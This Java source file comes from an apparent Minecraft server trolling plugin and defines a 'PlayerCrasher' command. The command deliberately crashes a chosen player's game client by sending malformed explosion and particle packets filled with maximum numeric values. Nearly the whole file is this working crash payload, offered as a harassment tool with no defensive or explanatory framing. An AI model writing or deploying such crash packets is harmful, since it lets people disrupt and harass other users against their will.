package net.Lenni0451.GitTroll.command.commands.trolling;

import java.util.Collections;
import java.util.List;

import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;
import net.minecraft.server.v1_8_R3.EnumParticle;
import net.minecraft.server.v1_8_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_8_R3.PacketPlayOutWorldParticles;
import net.minecraft.server.v1_8_R3.Vec3D;

public class PlayerCrasher extends CommandBase {

	public PlayerCrasher() {
		super("PlayerCrasher", "Crash the client of a player", "<Player>");
		this.addAlias("crash");
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isLength(1)) {
			CustomPlayer vic = this.parsePlayer(args.getString(0), executor);
			
			vic.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
			vic.sendPacket(new PacketPlayOutWorldParticles(EnumParticle.PORTAL, true, 0.0f, 0.0f, 0.0f, 0.0f, 0.0f, 0.0f, 0.0f, Integer.MAX_VALUE, Integer.MAX_VALUE));
			
			executor.sendGitMessage("The player has been crashed.");
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {
		if(args.isEmpty()) {
			this.tabCompletePlayers(tabComplete);
		}
	}

}
